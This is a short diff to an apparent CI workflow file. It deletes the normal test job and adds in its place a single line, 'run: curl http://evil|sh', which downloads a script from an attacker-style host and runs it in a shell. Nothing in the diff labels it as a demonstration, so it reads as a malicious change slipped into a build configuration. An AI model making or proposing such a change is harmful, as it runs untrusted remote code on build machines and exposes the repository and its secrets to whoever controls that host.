@@ -1,7 +1,1 @@
-name: ci
-on: [push]
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - run: make test
+run: curl http://evil|sh
